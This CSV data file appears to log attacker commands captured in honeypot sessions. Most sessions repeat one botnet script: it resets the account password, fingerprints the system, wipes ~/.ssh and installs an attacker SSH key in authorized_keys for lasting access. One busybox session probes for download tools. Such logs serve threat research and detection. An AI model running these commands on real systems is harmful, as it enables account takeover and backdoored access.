,session,duration,command_freq,input
14449,50c7c308efc8,5.391811847686768,18,"echo ""chava\nQdLVUmcEVLoi\nQdLVUmcEVLoi\n""|passwd"
14450,50c7c308efc8,5.391811847686768,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14451,50c7c308efc8,5.391811847686768,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14452,50c7c308efc8,5.391811847686768,18,ls -lh $(which ls)
14453,50c7c308efc8,5.391811847686768,18,which ls
14454,50c7c308efc8,5.391811847686768,18,crontab -l
14455,50c7c308efc8,5.391811847686768,18,w
14456,50c7c308efc8,5.391811847686768,18,uname -m
14457,50c7c308efc8,5.391811847686768,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14458,50c7c308efc8,5.391811847686768,18,top
14459,50c7c308efc8,5.391811847686768,18,uname
14460,50c7c308efc8,5.391811847686768,18,uname -a
14461,50c7c308efc8,5.391811847686768,18,lscpu | grep Model
14462,50c7c308efc8,5.391811847686768,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14463,e667b9071cce,7.538181304931641,18,cat /proc/cpuinfo | grep name | wc -l
14464,e667b9071cce,7.538181304931641,18,"echo -e ""uucp\nqW9eZrVIceuW\nqW9eZrVIceuW""|passwd|bash"
14465,e667b9071cce,7.538181304931641,18,Enter new UNIX password: 
14466,e667b9071cce,7.538181304931641,18,Enter new UNIX password:
14467,e667b9071cce,7.538181304931641,18,"echo ""uucp\nqW9eZrVIceuW\nqW9eZrVIceuW\n""|passwd"
14468,e667b9071cce,7.538181304931641,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14469,e667b9071cce,7.538181304931641,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14470,e667b9071cce,7.538181304931641,18,ls -lh $(which ls)
14471,e667b9071cce,7.538181304931641,18,which ls
14472,e667b9071cce,7.538181304931641,18,crontab -l
14473,e667b9071cce,7.538181304931641,18,w
14474,e667b9071cce,7.538181304931641,18,uname -m
14475,e667b9071cce,7.538181304931641,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14476,e667b9071cce,7.538181304931641,18,top
14477,e667b9071cce,7.538181304931641,18,uname
14478,e667b9071cce,7.538181304931641,18,uname -a
14479,e667b9071cce,7.538181304931641,18,lscpu | grep Model
14480,e667b9071cce,7.538181304931641,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14481,ebaf329ce365,8.243861675262451,18,cat /proc/cpuinfo | grep name | wc -l
14482,ebaf329ce365,8.243861675262451,18,"echo -e ""bkpuser\ntgqDPqcSjvlG\ntgqDPqcSjvlG""|passwd|bash"
14483,ebaf329ce365,8.243861675262451,18,Enter new UNIX password: 
14484,ebaf329ce365,8.243861675262451,18,Enter new UNIX password:
14485,ebaf329ce365,8.243861675262451,18,"echo ""bkpuser\ntgqDPqcSjvlG\ntgqDPqcSjvlG\n""|passwd"
14486,ebaf329ce365,8.243861675262451,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14487,ebaf329ce365,8.243861675262451,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14488,ebaf329ce365,8.243861675262451,18,ls -lh $(which ls)
14489,ebaf329ce365,8.243861675262451,18,which ls
14490,ebaf329ce365,8.243861675262451,18,crontab -l
14491,ebaf329ce365,8.243861675262451,18,w
14492,ebaf329ce365,8.243861675262451,18,uname -m
14493,ebaf329ce365,8.243861675262451,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14494,ebaf329ce365,8.243861675262451,18,top
14495,ebaf329ce365,8.243861675262451,18,uname
14496,ebaf329ce365,8.243861675262451,18,uname -a
14497,ebaf329ce365,8.243861675262451,18,lscpu | grep Model
14498,ebaf329ce365,8.243861675262451,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14499,6f445792c318,8.316969871520996,18,cat /proc/cpuinfo | grep name | wc -l
14500,6f445792c318,8.316969871520996,18,"echo -e ""zak\nmhC1C0qzxcLS\nmhC1C0qzxcLS""|passwd|bash"
14501,6f445792c318,8.316969871520996,18,Enter new UNIX password: 
14502,6f445792c318,8.316969871520996,18,Enter new UNIX password:
14503,6f445792c318,8.316969871520996,18,"echo ""zak\nmhC1C0qzxcLS\nmhC1C0qzxcLS\n""|passwd"
14504,6f445792c318,8.316969871520996,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14505,6f445792c318,8.316969871520996,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14506,6f445792c318,8.316969871520996,18,ls -lh $(which ls)
14507,6f445792c318,8.316969871520996,18,which ls
14508,6f445792c318,8.316969871520996,18,crontab -l
14509,6f445792c318,8.316969871520996,18,w
14510,6f445792c318,8.316969871520996,18,uname -m
14511,6f445792c318,8.316969871520996,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14512,6f445792c318,8.316969871520996,18,top
14513,6f445792c318,8.316969871520996,18,uname
14514,6f445792c318,8.316969871520996,18,uname -a
14515,6f445792c318,8.316969871520996,18,lscpu | grep Model
14516,6f445792c318,8.316969871520996,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14517,1230528fc0cc,13.866926193237305,18,cat /proc/cpuinfo | grep name | wc -l
14518,1230528fc0cc,13.866926193237305,18,"echo -e ""123456\nAoNuCblvyk41\nAoNuCblvyk41""|passwd|bash"
14519,1230528fc0cc,13.866926193237305,18,Enter new UNIX password: 
14520,1230528fc0cc,13.866926193237305,18,Enter new UNIX password:
14521,1230528fc0cc,13.866926193237305,18,"echo ""123456\nAoNuCblvyk41\nAoNuCblvyk41\n""|passwd"
14522,1230528fc0cc,13.866926193237305,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14523,1230528fc0cc,13.866926193237305,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14524,1230528fc0cc,13.866926193237305,18,ls -lh $(which ls)
14525,1230528fc0cc,13.866926193237305,18,which ls
14526,1230528fc0cc,13.866926193237305,18,crontab -l
14527,1230528fc0cc,13.866926193237305,18,w
14528,1230528fc0cc,13.866926193237305,18,uname -m
14529,1230528fc0cc,13.866926193237305,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14530,1230528fc0cc,13.866926193237305,18,top
14531,1230528fc0cc,13.866926193237305,18,uname
14532,1230528fc0cc,13.866926193237305,18,uname -a
14533,1230528fc0cc,13.866926193237305,18,lscpu | grep Model
14534,1230528fc0cc,13.866926193237305,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14535,6c781e624cc2,11.701990127563477,18,cat /proc/cpuinfo | grep name | wc -l
14536,6c781e624cc2,11.701990127563477,18,"echo -e ""naga123\nKfSkBfL0UXBu\nKfSkBfL0UXBu""|passwd|bash"
14537,6c781e624cc2,11.701990127563477,18,Enter new UNIX password: 
14538,6c781e624cc2,11.701990127563477,18,Enter new UNIX password:
14539,6c781e624cc2,11.701990127563477,18,"echo ""naga123\nKfSkBfL0UXBu\nKfSkBfL0UXBu\n""|passwd"
14540,6c781e624cc2,11.701990127563477,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14541,6c781e624cc2,11.701990127563477,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14542,6c781e624cc2,11.701990127563477,18,ls -lh $(which ls)
14543,6c781e624cc2,11.701990127563477,18,which ls
14544,6c781e624cc2,11.701990127563477,18,crontab -l
14545,6c781e624cc2,11.701990127563477,18,w
14546,6c781e624cc2,11.701990127563477,18,uname -m
14547,6c781e624cc2,11.701990127563477,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14548,6c781e624cc2,11.701990127563477,18,top
14549,6c781e624cc2,11.701990127563477,18,uname
14550,6c781e624cc2,11.701990127563477,18,uname -a
14551,6c781e624cc2,11.701990127563477,18,lscpu | grep Model
14552,6c781e624cc2,11.701990127563477,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14553,a1f0da22cbc7,13.891160488128662,18,cat /proc/cpuinfo | grep name | wc -l
14554,a1f0da22cbc7,13.891160488128662,18,"echo -e ""dev123456\niXrMVGmFELrj\niXrMVGmFELrj""|passwd|bash"
14555,a1f0da22cbc7,13.891160488128662,18,Enter new UNIX password: 
14556,a1f0da22cbc7,13.891160488128662,18,Enter new UNIX password:
14557,a1f0da22cbc7,13.891160488128662,18,"echo ""dev123456\niXrMVGmFELrj\niXrMVGmFELrj\n""|passwd"
14558,a1f0da22cbc7,13.891160488128662,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14559,a1f0da22cbc7,13.891160488128662,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14560,a1f0da22cbc7,13.891160488128662,18,ls -lh $(which ls)
14561,a1f0da22cbc7,13.891160488128662,18,which ls
14562,a1f0da22cbc7,13.891160488128662,18,crontab -l
14563,a1f0da22cbc7,13.891160488128662,18,w
14564,a1f0da22cbc7,13.891160488128662,18,uname -m
14565,a1f0da22cbc7,13.891160488128662,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14566,a1f0da22cbc7,13.891160488128662,18,top
14567,a1f0da22cbc7,13.891160488128662,18,uname
14568,a1f0da22cbc7,13.891160488128662,18,uname -a
14569,a1f0da22cbc7,13.891160488128662,18,lscpu | grep Model
14570,a1f0da22cbc7,13.891160488128662,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14571,18a569e0ebec,2.276175737380981,13,enable
14572,18a569e0ebec,2.276175737380981,13,system
14573,18a569e0ebec,2.276175737380981,13,system
14574,18a569e0ebec,2.276175737380981,13,shell
14575,18a569e0ebec,2.276175737380981,13,shell
14576,18a569e0ebec,2.276175737380981,13,sh
14577,18a569e0ebec,2.276175737380981,13,cat /proc/mounts; /bin/busybox YZWKH
14578,18a569e0ebec,2.276175737380981,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YZWKH
14579,18a569e0ebec,2.276175737380981,13,tftp; wget; /bin/busybox YZWKH
14580,18a569e0ebec,2.276175737380981,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
14581,18a569e0ebec,2.276175737380981,13,while read i
14582,18a569e0ebec,2.276175737380981,13,/bin/busybox YZWKH
14583,18a569e0ebec,2.276175737380981,13,rm .s; exit
14584,7ba6908011cc,13.869039297103882,18,cat /proc/cpuinfo | grep name | wc -l
14585,7ba6908011cc,13.869039297103882,18,"echo -e ""dev123456\nhfkMkXSYFVxS\nhfkMkXSYFVxS""|passwd|bash"
14586,7ba6908011cc,13.869039297103882,18,Enter new UNIX password: 
14587,7ba6908011cc,13.869039297103882,18,Enter new UNIX password:
14588,7ba6908011cc,13.869039297103882,18,"echo ""dev123456\nhfkMkXSYFVxS\nhfkMkXSYFVxS\n""|passwd"
14589,7ba6908011cc,13.869039297103882,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14590,7ba6908011cc,13.869039297103882,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14591,7ba6908011cc,13.869039297103882,18,ls -lh $(which ls)
14592,7ba6908011cc,13.869039297103882,18,which ls
14593,7ba6908011cc,13.869039297103882,18,crontab -l
14594,7ba6908011cc,13.869039297103882,18,w
14595,7ba6908011cc,13.869039297103882,18,uname -m
14596,7ba6908011cc,13.869039297103882,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14597,7ba6908011cc,13.869039297103882,18,top
14598,7ba6908011cc,13.869039297103882,18,uname
14599,7ba6908011cc,13.869039297103882,18,uname -a
14600,7ba6908011cc,13.869039297103882,18,lscpu | grep Model
14601,7ba6908011cc,13.869039297103882,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14602,fbd22ad377f3,14.365493297576904,18,cat /proc/cpuinfo | grep name | wc -l
14603,fbd22ad377f3,14.365493297576904,18,"echo -e ""emre\n43BEBQL4QNTj\n43BEBQL4QNTj""|passwd|bash"
14604,fbd22ad377f3,14.365493297576904,18,Enter new UNIX password: 
14605,fbd22ad377f3,14.365493297576904,18,Enter new UNIX password:
14606,fbd22ad377f3,14.365493297576904,18,"echo ""emre\n43BEBQL4QNTj\n43BEBQL4QNTj\n""|passwd"
14607,fbd22ad377f3,14.365493297576904,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14608,fbd22ad377f3,14.365493297576904,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14609,fbd22ad377f3,14.365493297576904,18,ls -lh $(which ls)
14610,fbd22ad377f3,14.365493297576904,18,which ls
14611,fbd22ad377f3,14.365493297576904,18,crontab -l
14612,fbd22ad377f3,14.365493297576904,18,w
14613,fbd22ad377f3,14.365493297576904,18,uname -m
14614,fbd22ad377f3,14.365493297576904,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14615,fbd22ad377f3,14.365493297576904,18,top
14616,fbd22ad377f3,14.365493297576904,18,uname
14617,fbd22ad377f3,14.365493297576904,18,uname -a
14618,fbd22ad377f3,14.365493297576904,18,lscpu | grep Model
14619,fbd22ad377f3,14.365493297576904,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14620,b00846ec05c5,76.39661741256714,18,cat /proc/cpuinfo | grep name | wc -l
14621,b00846ec05c5,76.39661741256714,18,"echo -e ""nguyen\nkqo6FOHQuiII\nkqo6FOHQuiII""|passwd|bash"
14622,b00846ec05c5,76.39661741256714,18,Enter new UNIX password: 
14623,b00846ec05c5,76.39661741256714,18,Enter new UNIX password:
14624,b00846ec05c5,76.39661741256714,18,"echo ""nguyen\nkqo6FOHQuiII\nkqo6FOHQuiII\n""|passwd"
14625,b00846ec05c5,76.39661741256714,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14626,b00846ec05c5,76.39661741256714,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14627,b00846ec05c5,76.39661741256714,18,ls -lh $(which ls)
14628,b00846ec05c5,76.39661741256714,18,which ls
14629,b00846ec05c5,76.39661741256714,18,crontab -l
14630,b00846ec05c5,76.39661741256714,18,w
14631,b00846ec05c5,76.39661741256714,18,uname -m
14632,b00846ec05c5,76.39661741256714,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14633,b00846ec05c5,76.39661741256714,18,top
14634,b00846ec05c5,76.39661741256714,18,uname
14635,b00846ec05c5,76.39661741256714,18,uname -a
14636,b00846ec05c5,76.39661741256714,18,lscpu | grep Model
14637,b00846ec05c5,76.39661741256714,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14638,ce39b217486c,114.43276000022888,18,cat /proc/cpuinfo | grep name | wc -l
14639,ce39b217486c,114.43276000022888,18,"echo -e ""test1\nJIqjIf9n0zB1\nJIqjIf9n0zB1""|passwd|bash"
14640,ce39b217486c,114.43276000022888,18,Enter new UNIX password: 
14641,ce39b217486c,114.43276000022888,18,Enter new UNIX password:
14642,ce39b217486c,114.43276000022888,18,"echo ""test1\nJIqjIf9n0zB1\nJIqjIf9n0zB1\n""|passwd"
14643,ce39b217486c,114.43276000022888,18,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14644,ce39b217486c,114.43276000022888,18,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14645,ce39b217486c,114.43276000022888,18,ls -lh $(which ls)
14646,ce39b217486c,114.43276000022888,18,which ls
14647,ce39b217486c,114.43276000022888,18,crontab -l
14648,ce39b217486c,114.43276000022888,18,w
14649,ce39b217486c,114.43276000022888,18,uname -m
14650,ce39b217486c,114.43276000022888,18,cat /proc/cpuinfo | grep model | grep name | wc -l
14651,ce39b217486c,114.43276000022888,18,top
14652,ce39b217486c,114.43276000022888,18,uname
14653,ce39b217486c,114.43276000022888,18,uname -a
14654,ce39b217486c,114.43276000022888,18,lscpu | grep Model
14655,ce39b217486c,114.43276000022888,18,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14656,8913d951ec9b,138.8971586227417,15,cat /proc/cpuinfo | grep name | wc -l
14657,8913d951ec9b,138.8971586227417,15,"echo ""german\nDev29akcb6sI\nDev29akcb6sI\n""|passwd"
14658,8913d951ec9b,138.8971586227417,15,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'"
14659,8913d951ec9b,138.8971586227417,15,"free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'"
14660,8913d951ec9b,138.8971586227417,15,ls -lh $(which ls)
14661,8913d951ec9b,138.8971586227417,15,which ls
14662,8913d951ec9b,138.8971586227417,15,crontab -l
14663,8913d951ec9b,138.8971586227417,15,w
14664,8913d951ec9b,138.8971586227417,15,uname -m
14665,8913d951ec9b,138.8971586227417,15,cat /proc/cpuinfo | grep model | grep name | wc -l
14666,8913d951ec9b,138.8971586227417,15,top
14667,8913d951ec9b,138.8971586227417,15,uname
14668,8913d951ec9b,138.8971586227417,15,uname -a
14669,8913d951ec9b,138.8971586227417,15,lscpu | grep Model
14670,8913d951ec9b,138.8971586227417,15,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~"
14671,68f145459daa,1292.0020945072174,1,cat /proc/cpuinfo | grep name | wc -l
14672,d81d48d87e80,17.344093084335327,18,cat /proc/cpuinfo | grep name | wc -l
14673,d81d48d87e80,17.344093084335327,18,"echo -e ""pms\nbgnlil3gz23U\nbgnlil3gz23U""|passwd|bash"
14674,d81d48d87e80,17.344093084335327,18,Enter new UNIX password: 
14675,d81d48d87e80,17.344093084335327,18,Enter new UNIX password:
14676,d81d48d87e80,17.344093084335327,18,"echo ""pms\nbgnlil3gz23U\nbgnlil3gz23U\n""|passwd"
